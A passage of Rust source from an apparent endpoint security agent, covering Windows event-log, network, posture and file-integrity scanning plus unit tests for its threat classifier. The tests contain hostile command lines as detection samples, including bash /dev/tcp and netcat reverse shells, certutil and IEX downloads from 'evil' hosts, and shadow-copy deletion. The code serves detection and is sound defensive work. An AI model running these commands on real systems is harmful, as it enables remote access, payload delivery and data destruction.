                proc_snapshot.push((pid, ppid, name.trim().to_string(), cmdline.to_string()));
            }
        }
    }
    // Process ancestry: flag a suspicious parent->child chain (e.g. an Office
    // app spawning a shell), with the specific chain named in the finding.
    for finding in ancestry_findings(&proc_snapshot) {
        direct_findings.push(finding);
    }

    // Established outbound connections to a non-private remote address
    // -- see `RULES`' own doc comment for why this is a classify()
    // source, not a baseline-diff table. `-ErrorAction SilentlyContinue`
    // per-cmdlet since a `-State Established` filter finding nothing is
    // completely normal, not a failure worth surfacing. The private/
    // loopback filter runs agent-side (`is_private_or_loopback`, shared
    // with the Linux path) rather than in PowerShell, so both platforms
    // use the exact same range logic.
    let outbound_script = "Get-NetTCPConnection -State Established -ErrorAction SilentlyContinue | \
         ForEach-Object { \"$($_.RemoteAddress)`t$($_.RemotePort)\" }";
    if let Ok(output) = crate::process::run_command(
        "powershell.exe",
        &["-NoProfile", "-NonInteractive", "-Command", outbound_script],
    )
    .await
    {
        for line in output.stdout.lines() {
            let mut parts = line.splitn(2, '\t');
            if let (Some(addr_str), Some(port_str)) = (parts.next(), parts.next())
                && let Ok(ip) = addr_str.trim().parse::<IpAddr>()
                && let Ok(port) = port_str.trim().parse::<u16>()
                && !is_private_or_loopback(&ip)
            {
                lines_with_source.push((
                    "network-outbound",
                    format!("remote_port={port}\tremote_addr={ip}\tproto=tcp"),
                ));
            }
        }
    }

    // LSASS memory access (Sysmon 10, M1): a dedicated, tightly-scoped query
    // rather than a generic channel. Sysmon ProcessAccess fires on every handle
    // opened to any process (overwhelmingly benign), so collecting it broadly
    // would flood the scan; instead this filters server-side to TargetImage
    // ending in lsass.exe and reports only the suspicious high-access masks
    // associated with credential dumping (0x1010/0x1410/0x1438/0x143a/0x1fffff).
    // The SourceImage opening the handle is named in the finding. Best-effort:
    // silently nothing if Sysmon isn't installed.
    direct_findings.extend(windows_lsass_access_findings().await);

    let scanned = lines_with_source.len();
    let mut stdout = String::new();
    let mut matched_count = 0usize;
    for (source, line) in &lines_with_source {
        if let Some((severity, label)) = classify_line(source, line, &c2_ports) {
            matched_count += 1;
            stdout.push_str(&format!("{severity}\t{label}\t{source}\t{line}\n"));
        }
    }

    // Already-classified findings (process ancestry, LSASS access) -- emitted
    // the same way posture/Defender findings are, each a complete wire line.
    for finding in &direct_findings {
        matched_count += 1;
        stdout.push_str(finding);
        stdout.push('\n');
    }

    // Unquoted service paths -- a definitive misconfiguration (not a pattern
    // match), so emitted directly as a finding. Enumerated here rather than via
    // the hashed watch-list because we want the specific offending service named.
    let services_script = "Get-CimInstance Win32_Service -ErrorAction SilentlyContinue | \
         ForEach-Object { \"$($_.Name)`t$($_.PathName)\" }";
    if let Ok(output) = crate::process::run_command(
        "powershell.exe",
        &["-NoProfile", "-NonInteractive", "-Command", services_script],
    )
    .await
    {
        for line in output.stdout.lines() {
            if let Some((name, path)) = line.split_once('\t')
                && unquoted_service_path(path)
            {
                matched_count += 1;
                stdout.push_str(&format!(
                    "medium\tUnquoted service path\tservice-config\tservice={} path={}\n",
                    name.trim(),
                    path.trim()
                ));
            }
        }
    }

    // Windows Defender protection posture -- direct findings (not pattern
    // matches) when core protection is off or signatures are stale. Only
    // present on hosts running Defender; PowerShell emits the wire-format lines
    // itself, so nothing is added on hosts without it.
    let defender_script = "$s = Get-MpComputerStatus -ErrorAction SilentlyContinue; if ($s) { \
         if (-not $s.AntivirusEnabled) { \"high`tDefender antivirus disabled`tdefender-status`tAntivirusEnabled=false\" }; \
         if (-not $s.RealTimeProtectionEnabled) { \"high`tDefender real-time protection disabled`tdefender-status`tRealTimeProtectionEnabled=false\" }; \
         if (($s.PSObject.Properties.Name -contains 'IsTamperProtected') -and (-not $s.IsTamperProtected)) { \"medium`tDefender tamper protection off`tdefender-status`tIsTamperProtected=false\" }; \
         if ($s.AntivirusSignatureAge -gt 7) { \"medium`tDefender signatures stale`tdefender-status`tAntivirusSignatureAge=$($s.AntivirusSignatureAge) days\" } }";
    if let Ok(output) = crate::process::run_command(
        "powershell.exe",
        &["-NoProfile", "-NonInteractive", "-Command", defender_script],
    )
    .await
    {
        for line in output.stdout.lines() {
            if !line.trim().is_empty() {
                matched_count += 1;
                stdout.push_str(line);
                stdout.push('\n');
            }
        }
    }

    // Host security posture (M5) -- static misconfigurations that weaken the
    // whole machine, emitted as direct findings. The control plane dedups by
    // content, so a standing condition is recorded once, not every sweep.
    let posture_script = "$out = @(); \
         $smb = Get-SmbServerConfiguration -ErrorAction SilentlyContinue; \
         if ($smb -and $smb.EnableSMB1Protocol) { $out += \"high`tSMBv1 protocol enabled`tposture`tEnableSMB1Protocol=true\" }; \
         $lua = (Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' -Name EnableLUA -ErrorAction SilentlyContinue).EnableLUA; \
         if ($lua -eq 0) { $out += \"high`tUAC disabled`tposture`tEnableLUA=0\" }; \
         $rdpDeny = (Get-ItemProperty 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server' -Name fDenyTSConnections -ErrorAction SilentlyContinue).fDenyTSConnections; \
         $nla = (Get-ItemProperty 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp' -Name UserAuthentication -ErrorAction SilentlyContinue).UserAuthentication; \
         if ($rdpDeny -eq 0 -and $nla -eq 0) { $out += \"medium`tRDP without Network Level Authentication`tposture`tUserAuthentication=0\" }; \
         $ppl = (Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' -Name RunAsPPL -ErrorAction SilentlyContinue).RunAsPPL; \
         if ($ppl -ne 1) { $out += \"low`tLSASS not a protected process (RunAsPPL off)`tposture`tRunAsPPL=$ppl\" }; \
         $wd = (Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest' -Name UseLogonCredential -ErrorAction SilentlyContinue).UseLogonCredential; \
         if ($wd -eq 1) { $out += \"high`tWDigest cleartext credential caching enabled`tposture`tUseLogonCredential=1\" }; \
         if ($smb -and -not $smb.RequireSecuritySigning) { $out += \"low`tSMB signing not required (AiTM/relay exposure)`tposture`tRequireSecuritySigning=false\" }; \
         $llmnr = (Get-ItemProperty 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\DNSClient' -Name EnableMulticast -ErrorAction SilentlyContinue).EnableMulticast; \
         if ($llmnr -ne 0) { $out += \"low`tLLMNR enabled (name-resolution poisoning exposure)`tposture`tEnableMulticast=$llmnr\" }; \
         try { $dg = Get-CimInstance -ClassName Win32_DeviceGuard -Namespace 'root\\Microsoft\\Windows\\DeviceGuard' -ErrorAction Stop; if (-not ($dg.SecurityServicesRunning -contains 1)) { $out += \"low`tCredential Guard not running`tposture`tSecurityServicesRunning=off\" } } catch {}; \
         try { $bl = Get-BitLockerVolume -MountPoint $env:SystemDrive -ErrorAction Stop; if ($bl.ProtectionStatus -ne 'On') { $out += \"low`tBitLocker not enabled on the system drive`tposture`tProtectionStatus=$($bl.ProtectionStatus)\" } } catch {}; \
         try { $psv2 = Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2 -ErrorAction Stop; if ($psv2.State -eq 'Enabled') { $out += \"low`tPowerShell v2 engine present (logging bypass)`tposture`tMicrosoftWindowsPowerShellV2=Enabled\" } } catch {}; \
         $out";
    if let Ok(output) = crate::process::run_command(
        "powershell.exe",
        &["-NoProfile", "-NonInteractive", "-Command", posture_script],
    )
    .await
    {
        for line in output.stdout.lines() {
            if !line.trim().is_empty() {
                matched_count += 1;
                stdout.push_str(line);
                stdout.push('\n');
            }
        }
    }

    // File-integrity watch-list -- see `WINDOWS_FIM_WATCHLIST`'s doc
    // comment for what each item captures and why it's hashed uniformly.
    for item in WINDOWS_FIM_WATCHLIST {
        let hash_script = windows_fim_hash_script(item.capture_expr);
        if let Ok(output) = crate::process::run_command(
            "powershell.exe",
            &["-NoProfile", "-NonInteractive", "-Command", &hash_script],
        )
        .await
        {
            let hash = output.stdout.trim();
            if !hash.is_empty() {
                stdout.push_str(&format!("fim\t{}\t{hash}\n", item.identifier));
            }
        }
    }

    // Admin-configured extra paths (Phase 7b) -- additive to the fixed
    // watch-list above, re-validated here even though the control plane
    // already checked them (see `AgentOperation::ScanSecurityEvents`'s
    // own doc comment).
    for path in &extra_fim_paths {
        if !abyssal_agent_protocol::is_valid_windows_absolute_path(path) {
            continue;
        }
        let capture_expr = format!(
            "(Get-Content -Raw -Path {} -ErrorAction SilentlyContinue)",
            crate::process::ps_quote(path)
        );
        let hash_script = windows_fim_hash_script(&capture_expr);
        if let Ok(output) = crate::process::run_command(
            "powershell.exe",
            &["-NoProfile", "-NonInteractive", "-Command", &hash_script],
        )
        .await
        {
            let hash = output.stdout.trim();
            if !hash.is_empty() {
                stdout.push_str(&format!("fim\t{path}\t{hash}\n"));
            }
        }
    }

    // Per-user SSH `authorized_keys` files (Phase 10) -- Windows analog
    // of the Linux `find`-based discovery: OpenSSH-for-Windows (an
    // optional, increasingly common Windows feature) stores per-user
    // keys at `C:\Users\<user>\.ssh\authorized_keys` and a single
    // centralized file for admin accounts at `C:\ProgramData\ssh\
    // administrators_authorized_keys`. Discovered fresh every scan
    // (the set of users isn't fixed), then hashed the same one-call-
    // per-path way `extra_fim_paths` already is above.
    let discover_keys_script = "$paths = @(Get-ChildItem -Path 'C:\\Users\\*\\.ssh\\authorized_keys' \
         -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName); \
         if (Test-Path 'C:\\ProgramData\\ssh\\administrators_authorized_keys') { \
         $paths += 'C:\\ProgramData\\ssh\\administrators_authorized_keys' }; $paths";
    if let Ok(output) = crate::process::run_command(
        "powershell.exe",
        &[
            "-NoProfile",
            "-NonInteractive",
            "-Command",
            discover_keys_script,
        ],
    )
    .await
    {
        for path in output
            .stdout
            .lines()
            .map(str::trim)
            .filter(|p| !p.is_empty())
        {
            let capture_expr = format!(
                "(Get-Content -Raw -Path {} -ErrorAction SilentlyContinue)",
                crate::process::ps_quote(path)
            );
            let hash_script = windows_fim_hash_script(&capture_expr);
            if let Ok(output) = crate::process::run_command(
                "powershell.exe",
                &["-NoProfile", "-NonInteractive", "-Command", &hash_script],
            )
            .await
            {
                let hash = output.stdout.trim();
                if !hash.is_empty() {
                    stdout.push_str(&format!("fim\t{path}\t{hash}\n"));
                }
            }
        }
    }

    // Listening ports -- reported fresh every scan, normalized to the
    // same `"tcp:<port>"`/`"udp:<port>"` shape `linux_listening_ports`
    // produces (see that function's doc comment for why the control
    // plane does the diffing, not the agent).
    let port_script = "$tcp = Get-NetTCPConnection -State Listen -ErrorAction SilentlyContinue | \
         ForEach-Object { \"tcp:$($_.LocalPort)\" }; \
         $udp = Get-NetUDPEndpoint -ErrorAction SilentlyContinue | \
         ForEach-Object { \"udp:$($_.LocalPort)\" }; \
         ($tcp + $udp) | Sort-Object -Unique";
    if let Ok(output) = crate::process::run_command(
        "powershell.exe",
        &["-NoProfile", "-NonInteractive", "-Command", port_script],
    )
    .await
    {
        for line in output.stdout.lines() {
            let port_key = line.trim();
            if !port_key.is_empty() {
                stdout.push_str(&format!("port\t{port_key}\n"));
            }
        }
    }

    // Currently running drivers (Phase 9) -- the Windows analog of
    // `linux_kernel_modules`: a malicious driver is exactly as real a
    // rootkit vector on Windows as a malicious kernel module is on
    // Linux, and a healthy host's set is naturally just as stable.
    let driver_script = "Get-CimInstance Win32_SystemDriver -Filter \"State='Running'\" \
         -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Name";
    if let Ok(output) = crate::process::run_command(
        "powershell.exe",
        &["-NoProfile", "-NonInteractive", "-Command", driver_script],
    )
    .await
    {
        for line in output.stdout.lines() {
            let module_key = line.trim();
            if !module_key.is_empty() {
                stdout.push_str(&format!("module\t{module_key}\n"));
            }
        }
    }

    // Per-channel high-water marks, so the control plane advances this host's
    // offsets and the next scan reads only newer events. Emitted even when
    // nothing matched -- advancing past benign events is the whole point.
    for (source, record_id) in &new_offsets {
        stdout.push_str(&format!("offset\t{source}\t{record_id}\n"));
    }

    if matched_count == 0 {
        let note = if scanned == 0 {
            "No event log entries were readable for the watched event IDs (Security, System, \
             and -- if enabled on this host -- PowerShell script block logging and Windows \
             Defender's operational log)."
                .to_string()
        } else {
            format!("Scanned {scanned} event(s); nothing matched the current detection rules.")
        };
        stdout.push_str(&format!("info\t{note}\n"));
    }

    CommandOutcome::Ok(OperationOutput {
        stdout,
        stderr: String::new(),
        exit_code: Some(0),
    })
}

/// Whether a Win32_Service `PathName` is an exploitable *unquoted service
/// path*: the executable path (before any arguments) contains a space but isn't
/// wrapped in quotes, so Windows would try each space-delimited prefix +
/// `.exe`, letting anyone who can write an intervening path (e.g.
/// `C:\Program.exe`) hijack the service at next start. Pure so it's unit-tested
/// on every platform; only *called* from the Windows scan.
#[cfg_attr(not(windows), allow(dead_code))]
fn unquoted_service_path(pathname: &str) -> bool {
    let p = pathname.trim();
    if p.is_empty() || p.starts_with('"') {
        return false;
    }
    // Consider only the executable portion, up to and including ".exe" -- args
    // after it (e.g. `svchost.exe -k netsvcs`) don't make the path vulnerable.
    let exe_path = match p.to_lowercase().find(".exe") {
        Some(i) => &p[..i + 4],
        None => p,
    };
    exe_path.contains(' ')
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn channel_script_uses_offset_filter_when_offset_known() {
        let s = windows_channel_script("Security", &[4624, 4625], 42);
        // Server-side record-id filter, not a fixed recent window.
        assert!(s.contains("-FilterXml"));
        assert!(s.contains("EventRecordID &gt; 42"));
        assert!(s.contains("EventID=4624 or EventID=4625"));
        assert!(s.contains("MAXRID="));
        assert!(!s.contains("-FilterHashtable"));
    }

    #[test]
    fn channel_script_baselines_a_bounded_window_on_first_scan() {
        let s = windows_channel_script("Security", &[4624], 0);
        // No offset yet -> bounded baseline, not an unbounded record-id filter.
        assert!(s.contains("-FilterHashtable"));
        assert!(s.contains("-MaxEvents 500"));
        assert!(!s.contains("EventRecordID"));
        assert!(s.contains("MAXRID="));
    }

    #[test]
    fn sysmon_id_marker_does_not_collide_with_four_digit_ids() {
        // Sysmon 8 line -> injection finding.
        assert_eq!(
            classify("EventID=8\tTime=t\tIpAddress=\tAccount=\tCreateRemoteThread"),
            Some((
                "high",
                "Possible process injection (Sysmon CreateRemoteThread)"
            ))
        );
        // A 4-digit ID that *contains* "8" must not match the Sysmon rule; 1102
        // is the audit-log-cleared finding, not the injection one.
        assert_eq!(
            classify("EventID=1102\tTime=t\tIpAddress=\tAccount=\tThe audit log was cleared"),
            Some(("high", "Windows audit log was cleared (anti-forensics)"))
        );
    }

    #[test]
    fn unquoted_service_path_flags_spaced_unquoted_exe() {
        // Classic vulnerable case.
        assert!(unquoted_service_path(r"C:\Program Files\Foo\bar.exe"));
        assert!(unquoted_service_path(r"C:\Program Files\Foo\bar.exe --run"));
    }

    #[test]
    fn unquoted_service_path_ignores_safe_paths() {
        // Quoted -> safe.
        assert!(!unquoted_service_path(r#""C:\Program Files\Foo\bar.exe""#));
        // No space in the exe path -> safe (svchost with args is the classic
        // false-positive this must not flag).
        assert!(!unquoted_service_path(
            r"C:\Windows\system32\svchost.exe -k netsvcs"
        ));
        assert!(!unquoted_service_path(r"C:\Windows\system32\lsass.exe"));
        assert!(!unquoted_service_path(""));
    }

    #[test]
    fn classifies_oom_killer_invocations_as_high() {
        assert_eq!(
            classify("kernel: [12345.678] myproc invoked oom-killer: gfp_mask=0x..."),
            Some(("high", "OOM killer invoked"))
        );
        assert_eq!(
            classify("Out of memory: Killed process 1234 (myproc) total-vm:..."),
            Some(("high", "OOM killer invoked"))
        );
    }

    #[test]
    fn classifies_hardware_and_io_errors() {
        assert_eq!(
            classify("mce: [Hardware Error]: Machine Check Event"),
            Some(("high", "Hardware machine-check event"))
        );
        assert_eq!(
            classify("Buffer I/O error on device sda1, logical block 12345"),
            Some(("medium", "Disk I/O error"))
        );
    }

    #[test]
    fn classifies_failed_systemd_units() {
        assert_eq!(
            classify("myapp.service loaded failed failed My App"),
            Some(("medium", "systemd unit failed"))
        );
    }

    #[test]
    fn segfault_still_classifies_after_the_new_rules_were_added() {
        // Regression check: the new kernel/systemd rules were appended
        // after the existing ones, not inserted in the middle -- make
        // sure that didn't silently reorder anything load-bearing.
        assert_eq!(
            classify("kernel: myproc[1234]: segfault at 0 ip 0000 sp 0000 error 4"),
            Some(("medium", "Process segfault"))
        );
    }

    #[test]
    fn unrelated_lines_do_not_classify() {
        assert_eq!(classify("systemd[1]: Started My App."), None);
        assert_eq!(classify("kernel: [1.0] Linux version 6.1.0"), None);
    }

    #[test]
    fn classifies_windows_event_log_signals_by_stable_event_id_marker() {
        assert_eq!(
            classify("EventID=4625\tTime=2026-01-01T00:00:00.000Z\tAn account failed to log on."),
            Some(("high", "Windows failed logon"))
        );
        assert_eq!(
            classify(
                "EventID=4624\tTime=2026-01-01T00:00:00.000Z\tAn account was successfully logged on."
            ),
            Some(("low", "Windows successful logon"))
        );
        assert_eq!(
            classify("EventID=4720\tTime=2026-01-01T00:00:00.000Z\tA user account was created."),
            Some(("medium", "Windows user account created"))
        );
        assert_eq!(
            classify(
                "EventID=4732\tTime=2026-01-01T00:00:00.000Z\tA member was added to a security-enabled local group."
            ),
            Some(("high", "Windows account added to a security group"))
        );
    }

    #[test]
    fn classifies_windows_system_log_signals() {
        assert_eq!(
            classify(
                "EventID=6008\tTime=2026-01-01T00:00:00.000Z\tThe previous system shutdown was unexpected."
            ),
            Some(("high", "Unexpected system shutdown"))
        );
        assert_eq!(
            classify(
                "EventID=7000\tTime=2026-01-01T00:00:00.000Z\tThe Foo service failed to start."
            ),
            Some(("medium", "Windows service failed to start"))
        );
    }

    #[test]
    fn classifies_suspicious_process_creation_command_lines_regardless_of_event_id() {
        // 4688 (process creation) is deliberately not matched by EventID
        // alone -- see the RULES doc comment. Only a command line
        // containing a known obfuscation/LOLBin pattern should classify.
        assert_eq!(
            classify(
                "EventID=4688\tTime=2026-01-01T00:00:00.000Z\tpowershell.exe -EncodedCommand SQBFAFgA"
            ),
            Some(("high", "Suspicious encoded PowerShell command"))
        );
        assert_eq!(
            classify("EventID=4688\tTime=2026-01-01T00:00:00.000Z\tcmd.exe /c whoami /priv"),
            None
        );
    }

    #[test]
    fn classifies_broader_windows_security_log_signals() {
        assert_eq!(
            classify(
                "EventID=4648\tTime=2026-01-01T00:00:00.000Z\tA logon was attempted using explicit credentials."
            ),
            Some((
                "high",
                "Explicit-credential logon (possible lateral movement)"
            ))
        );
        assert_eq!(
            classify(
                "EventID=4672\tTime=2026-01-01T00:00:00.000Z\tSpecial privileges assigned to new logon."
            ),
            Some(("medium", "Privileged logon (admin/SYSTEM-level)"))
        );
        assert_eq!(
            classify(
                "EventID=4697\tTime=2026-01-01T00:00:00.000Z\tA service was installed in the system."
            ),
            Some(("high", "Windows service installed"))
        );
        assert_eq!(
            classify(
                "EventID=4719\tTime=2026-01-01T00:00:00.000Z\tSystem audit policy was changed."
            ),
            Some((
                "high",
                "System audit policy changed (possible log tampering)"
            ))
        );
        assert_eq!(
            classify("EventID=1102\tTime=2026-01-01T00:00:00.000Z\tThe audit log was cleared."),
            Some(("high", "Windows audit log was cleared (anti-forensics)"))
        );
        assert_eq!(
            classify("EventID=4740\tTime=2026-01-01T00:00:00.000Z\tA user account was locked out."),
            Some(("low", "Windows account locked out"))
        );
    }

    #[test]
    fn classifies_scheduled_task_lifecycle_events_distinctly() {
        assert_eq!(
            classify("EventID=4698\tTime=2026-01-01T00:00:00.000Z\tA scheduled task was created."),
            Some(("medium", "Scheduled task created"))
        );
        assert_eq!(
            classify("EventID=4699\tTime=2026-01-01T00:00:00.000Z\tA scheduled task was deleted."),
            Some(("medium", "Scheduled task deleted"))
        );
        assert_eq!(
            classify("EventID=4700\tTime=2026-01-01T00:00:00.000Z\tA scheduled task was enabled."),
            Some(("medium", "Scheduled task enabled"))
        );
        assert_eq!(
            classify("EventID=4701\tTime=2026-01-01T00:00:00.000Z\tA scheduled task was disabled."),
            Some(("medium", "Scheduled task disabled"))
        );
        assert_eq!(
            classify("EventID=4702\tTime=2026-01-01T00:00:00.000Z\tA scheduled task was updated."),
            Some(("medium", "Scheduled task updated"))
        );
    }

    #[test]
    fn classifies_windows_defender_signals() {
        assert_eq!(
            classify(
                "EventID=1116\tTime=2026-01-01T00:00:00.000Z\tWindows Defender has detected malware."
            ),
            Some(("high", "Windows Defender detected malware"))
        );
        assert_eq!(
            classify(
                "EventID=5001\tTime=2026-01-01T00:00:00.000Z\tReal-time protection was disabled."
            ),
            Some(("high", "Windows Defender real-time protection disabled"))
        );
    }

    #[test]
    fn powershell_script_block_logging_reuses_existing_lolbin_rules() {
        // Event 4104 lines carry no dedicated RULES entry of their own --
        // they reuse whichever LOLBin/obfuscation pattern already exists
        // for 4688, since the underlying signal (a suspicious command/
        // script) is the same regardless of which log emitted it.
        assert_eq!(
            classify(
                "EventID=4104\tTime=2026-01-01T00:00:00.000Z\tCreating Scriptblock text (1 of 1): IEX (New-Object Net.WebClient).DownloadString('http://evil') -EncodedCommand"
            ),
            Some(("high", "Suspicious encoded PowerShell command"))
        );
    }

    #[test]
    fn classifies_reverse_shell_process_command_lines() {
        assert_eq!(
            classify("bash -c bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"),
            Some(("high", "Possible reverse shell (bash /dev/tcp construct)"))
        );
        assert_eq!(
            classify("nc -e /bin/sh 10.0.0.1 4444"),
            Some(("high", "Possible reverse shell (netcat -e)"))
        );
        assert_eq!(
            classify("ncat --exec /bin/sh 10.0.0.1 4444"),
            Some(("high", "Possible reverse shell (ncat --exec)"))
        );
    }

    #[test]
    fn ordinary_process_command_lines_do_not_classify() {
        assert_eq!(classify("/usr/sbin/sshd -D"), None);
        assert_eq!(classify("nginx: worker process"), None);
        assert_eq!(classify("/usr/bin/python3 /opt/app/server.py"), None);
    }

    #[cfg(unix)]
    #[test]
    fn parses_listening_port_from_ss_style_line() {
        assert_eq!(
            parse_listening_port("LISTEN 0      128        0.0.0.0:22           0.0.0.0:*", 3),
            Some("22")
        );
        assert_eq!(
            parse_listening_port(
                "LISTEN 0      4096          [::]:443              [::]:*",
                3
            ),
            Some("443")
        );
    }

    #[cfg(unix)]
    #[test]
    fn parses_listening_port_from_netstat_style_line() {
        assert_eq!(
            parse_listening_port(
                "tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN",
                3
            ),
            Some("8080")
        );
    }

    #[test]
    fn classifies_configured_c2_ports() {
        let c2 = [4444u16, 1337, 31337, 6666, 6667];
        for port in c2 {
            assert_eq!(
                classify_line(
                    "network-outbound",
                    &format!("remote_port={port}\tremote_addr=203.0.113.9\tproto=tcp"),
                    &c2,
                ),
                Some((
                    "high",
                    "Outbound connection to a flagged C2/reverse-shell port"
                )),
                "port {port} should classify"
            );
        }
    }

    #[test]
    fn c2_port_match_is_exact_not_substring() {
        let c2 = [1337u16, 6667];
        // Regression check: port 13370 must NOT match a rule for 1337, and
        // 16667 must not match 6667 -- the old substring table had exactly this
        // trailing/leading-digit false-match; exact numeric comparison fixes it.
        assert_eq!(
            classify_line(
                "network-outbound",
                "remote_port=13370\tremote_addr=203.0.113.9\tproto=tcp",
                &c2,
            ),
            None
        );
        assert_eq!(
            classify_line(
                "network-outbound",
                "remote_port=16667\tremote_addr=203.0.113.9\tproto=tcp",
                &c2,
            ),
            None
        );
        // A port that isn't in the set doesn't classify.
        assert_eq!(
            classify_line(
                "network-outbound",
                "remote_port=443\tremote_addr=203.0.113.9\tproto=tcp",
                &c2,
            ),
            None
        );
        // An empty set means no port-based flagging at all.
        assert_eq!(
            classify_line(
                "network-outbound",
                "remote_port=4444\tremote_addr=203.0.113.9\tproto=tcp",
                &[],
            ),
            None
        );
    }

    #[test]
    fn c2_ports_only_apply_to_outbound_source() {
        // The same text under a non-network source must never flag as C2 --
        // the port set only applies to outbound-network lines.
        assert_eq!(
            classify_line(
                "process",
                "remote_port=4444\tremote_addr=203.0.113.9\tproto=tcp",
                &[4444],
            ),
            None
        );
    }

    #[test]
    fn fast_channel_script_is_offset_free_and_bounded() {
        let s = windows_fast_channel_script("Security", &[1102, 4688]);
        assert!(s.contains("Id=1102,4688"));
        assert!(s.contains("-MaxEvents 50"));
        // The fast query must NOT track offsets or emit a high-water mark.
        assert!(!s.contains("MAXRID"));
        assert!(!s.contains("EventRecordID"));
    }

    #[test]
    fn fast_scan_outcome_emits_only_matches_and_no_info_line() {
        let lines: Vec<(&'static str, String)> = vec![
            ("process", "nginx: worker process".to_string()),
            (
                "process",
                "bash -c bash -i >& /dev/tcp/10.0.0.1/4444 0>&1".to_string(),
            ),
        ];
        let CommandOutcome::Ok(out) = fast_scan_outcome(&lines, &[]) else {
            panic!("expected Ok");
        };
        // Only the reverse-shell line classifies; the benign one is dropped.
        assert_eq!(out.stdout.lines().count(), 1);
        assert!(out.stdout.contains("Possible reverse shell"));
        assert!(!out.stdout.contains("info\t"));
    }

    #[test]
    fn parses_outbound_remote_port() {
        assert_eq!(
            outbound_remote_port("remote_port=4444\tremote_addr=203.0.113.9\tproto=tcp"),
            Some(4444)
        );
        assert_eq!(
            outbound_remote_port("remote_addr=203.0.113.9\tproto=tcp"),
            None
        );
        assert_eq!(
            outbound_remote_port("remote_port=99999\tremote_addr=x"),
            None
        );
    }

    #[test]
    fn multi_rules_match_case_insensitively_and_require_all_parts() {
        // certutil download: both parts present -> match; one alone -> no match.
        assert_eq!(
            classify("certutil.exe -urlcache -split -f http://evil/x.exe x.exe"),
            Some(("high", "Ingress tool transfer via certutil"))
        );
        assert_eq!(classify("certutil.exe -hashfile x.exe SHA256"), None);
        // Case-insensitive.
        assert_eq!(
            classify("VSSADMIN.EXE Delete Shadows /All /Quiet"),
            Some((
                "high",
                "Shadow copy / backup deletion (ransomware precursor)"
            ))
        );
        assert_eq!(
            classify("C:\\Windows\\System32\\wbadmin.exe DELETE CATALOG -quiet"),
            Some((
                "high",
                "Shadow copy / backup deletion (ransomware precursor)"
            ))
        );
        assert_eq!(
            classify(
                "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v x /d evil"
            ),
            Some(("medium", "Run-key persistence added via reg.exe"))
        );
        // Ordinary command lines stay unclassified.
        assert_eq!(classify("certutil -store my"), None);
        assert_eq!(classify("reg query HKLM\\SOFTWARE\\Microsoft"), None);
    }

    #[test]
    fn known_c2_pipe_names_classify() {
        assert_eq!(
            classify("EventID=17\tTime=t\tIpAddress=\tAccount=\tPipeName: \\msagent_a1b2"),
            Some(("high", "Known command-and-control named pipe"))
        );
        assert_eq!(
            classify("EventID=18\tTime=t\tIpAddress=\tAccount=\tPipeName: \\postex_ssh_1234"),
            Some(("high", "Known command-and-control named pipe"))
        );
        // An ordinary pipe doesn't match.
        assert_eq!(
            classify("EventID=17\tTime=t\tIpAddress=\tAccount=\tPipeName: \\mojo.5688.8east"),
            None
        );
    }

    #[test]
    fn ancestry_label_flags_suspicious_chains_only() {
        assert_eq!(
            ancestry_label("WINWORD.EXE", "powershell.exe"),
            Some("Office application spawned a command interpreter")
        );
        assert_eq!(
            ancestry_label("excel.exe", "mshta.exe"),
            Some("Script host or LOLBin spawned by an office/browser process")
        );
        assert_eq!(
            ancestry_label("chrome.exe", "cscript.exe"),
            Some("Script host or LOLBin spawned by an office/browser process")
        );
        assert_eq!(
            ancestry_label("wmiprvse.exe", "cmd.exe"),
            Some("Command shell spawned by a long-running service host")
        );
        // Ordinary chains are not flagged.
        assert_eq!(ancestry_label("explorer.exe", "cmd.exe"), None);
        assert_eq!(ancestry_label("winword.exe", "splwow64.exe"), None);
    }

    #[test]
    fn ancestry_findings_resolves_parents_and_dedups() {
        // pid 100 = winword, pid 200 = powershell (child of 100),
        // pid 201 = powershell (also child of 100 -> deduped),
        // pid 300 = explorer, pid 301 = cmd (child of explorer -> benign).
        let snapshot = vec![
            (100u32, 1u32, "winword.exe".into(), "WINWORD.EXE /n".into()),
            (
                200u32,
                100u32,
                "powershell.exe".into(),
                "powershell -enc ZQBj".into(),
            ),
            (
                201u32,
                100u32,
                "powershell.exe".into(),
                "powershell -w hidden".into(),
            ),
            (300u32, 1u32, "explorer.exe".into(), "explorer.exe".into()),
            (301u32, 300u32, "cmd.exe".into(), "cmd.exe".into()),
        ];
        let findings = ancestry_findings(&snapshot);
        assert_eq!(
            findings.len(),
            1,
            "winword->powershell once, explorer->cmd never"
        );
        assert!(findings[0].starts_with(
            "high\tOffice application spawned a command interpreter\tprocess-ancestry\t"
        ));
        assert!(findings[0].contains("parent=winword.exe child=powershell.exe"));
    }

    #[test]
    fn lsass_access_finding_flags_memory_read_of_lsass_only() {
        assert!(
            lsass_access_finding(
                "C:\\temp\\mimikatz.exe",
                "C:\\Windows\\System32\\lsass.exe",
                "0x1410"
            )
            .is_some()
        );
        // Wrong target.
        assert!(
            lsass_access_finding("x.exe", "C:\\Windows\\System32\\notepad.exe", "0x1410").is_none()
        );
        // Target lsass but benign (query-only) access mask.
        assert!(
            lsass_access_finding("x.exe", "C:\\Windows\\System32\\lsass.exe", "0x1000").is_none()
        );
    }

    #[test]
    fn is_private_or_loopback_recognizes_common_internal_ranges() {
        for ip in [
            "10.0.0.5",
            "172.16.0.5",
            "192.168.1.5",
            "127.0.0.1",
            "169.254.1.1",
            "::1",
            "fc00::1",
            "fe80::1",
        ] {
            assert!(
                is_private_or_loopback(&ip.parse().unwrap()),
                "{ip} should be treated as private/loopback"
            );
        }
    }

    #[test]
    fn is_private_or_loopback_does_not_flag_public_addresses() {
        for ip in ["203.0.113.9", "8.8.8.8", "2001:db8::1"] {
            assert!(
                !is_private_or_loopback(&ip.parse().unwrap()),
